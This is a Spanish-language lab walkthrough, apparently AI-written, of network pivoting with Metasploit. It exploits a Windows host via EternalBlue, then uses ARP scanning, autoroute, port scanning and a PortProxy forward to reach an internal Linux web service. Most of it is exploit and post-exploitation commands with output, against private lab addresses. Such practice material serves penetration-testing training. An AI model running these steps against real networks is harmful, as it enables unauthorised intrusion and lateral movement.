# ** - Pivoting entre Windows y Linux con Metasploit (via EternalBlue y PortProxy)**

## **1. Introducción**

En esta práctica realizo un pivoting completo utilizando una máquina Windows como puente entre mi Kali (atacante) y una máquina Linux situada en una red interna no accesible directamente. Lo ideal es trabajar siempre con **Meterpreter**, porque facilita muchísimo todo el proceso de pivoting, routing y gestión de sesiones.

**Topología del escenario:**

* **Kali** → Máquina atacante
* **Windows** → Máquina intermedia (pivot)
* **Linux** → Máquina interna final

Accedo a Windows explotando **EternalBlue** y, desde ahí, pivotamos hacia la red interna.

---

## **2. Explotación inicial con EternalBlue**

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.8.11
run
```

Una vez dentro, obtengo sesión SYSTEM.

---

## **3. Verificación de interfaces (importante para pivoting)**

Desde Meterpreter:

```bash
meterpreter > ipconfig
```

El equipo Windows muestra **dos interfaces**:

* 10.0.8.11 → Red donde está mi Kali
* 10.0.9.5 → Red interna a la que no tengo acceso directo

Esto confirma que Windows puede servirnos como puente para pivotar.

---

## **4. Poner la sesión en background**

```bash
meterpreter > background
```

```bash
sessions -l
```

Tenemos la sesión activa y lista para pivotar.

---

## **5. Descubrimiento de hosts en la red interna**

Uso el módulo ARP Scanner desde la sesión Windows:

```bash
use post/windows/gather/arp_scanner
set SESSION 1
set RHOSTS 10.0.9.5/24
run
```

Resultados detectados:

```
10.0.9.5
10.0.9.6
10.0.9.3
10.0.9.2
10.0.9.1
```

Descarto los que comparten MAC (normalmente gateway/broadcast).

---

## **6. Añadir rutas automáticamente (Autoroute)**

```bash
use multi/manage/autoroute
set SESSION 1
run
```

Salida típica:

```
[+] Route added to subnet 10.0.8.0/24
[+] Route added to subnet 10.0.9.0/24
```

Ya puedo escanear máquinas que no estaban accesibles desde Kali.

---

## **7. Escaneo de puertos en Linux interno**

```bash
use scanner/portscan/tcp
set RHOSTS 10.0.9.6
run
```

Resultado útil:

```
22 OPEN
80 OPEN
81 OPEN
139 OPEN
445 OPEN
```

El puerto 80 queda como objetivo inicial.

---

## **8. Creación del túnel/port forwarding (PortProxy)**

Necesito redirigir el puerto 80 de la máquina Linux hacia un puerto local en Kali.

Módulo usado:

```bash
use post/windows/manage/portproxy
```

Configuración:

```bash
set CONNECT_ADDRESS 10.0.9.6
set CONNECT_PORT 80
set LOCAL_ADDRESS 0.0.0.0
set LOCAL_PORT 999
set SESSION 1
run
```

Salida típica:

```
[+] PortProxy added.
Local 0.0.0.0:999 → Remote 10.0.9.6:80
```

Ahora en mi Kali puedo abrir:

```bash
(http://10.0.8.11:999/)
```

Y ver el servicio web que realmente está en **10.0.9.6:80**.

---

## **9. Qué hago después del port forwarding**

Una vez tengo el puerto reexpedido:

* Puedo lanzar **gobuster**, **nikto**, **whatweb**, etc.
* Puedo intentar credenciales SSH si hay puerto 22.
* Puedo tunelar más puertos (445, 139, 81, etc.).
* Puedo incluso abrir un socks proxy y usar ProxChains.

---

## **10. Resumen del proceso**

1. Explotar Windows con EternalBlue.
2. Obtener sesión Meterpreter → comprobar interfaces.
3. Meterpreter en background.
4. ARP Scan para descubrir la red interna.
5. Autoroute para enrutar tráfico.
6. Portscan a hosts internos.
7. Crear port forwarding con PortProxy.
8. Acceder desde Kali como si los servicios internos fueran locales.

Este es el flujo típico que uso para pivotar desde Windows a Linux dentro de la red interna.

---

¿Quieres que prepare el siguiente archivo con **túneles SOCKS + Proxychains**, o prefieres primero pivoting avanzado como **SSH local/remote port forwarding**?
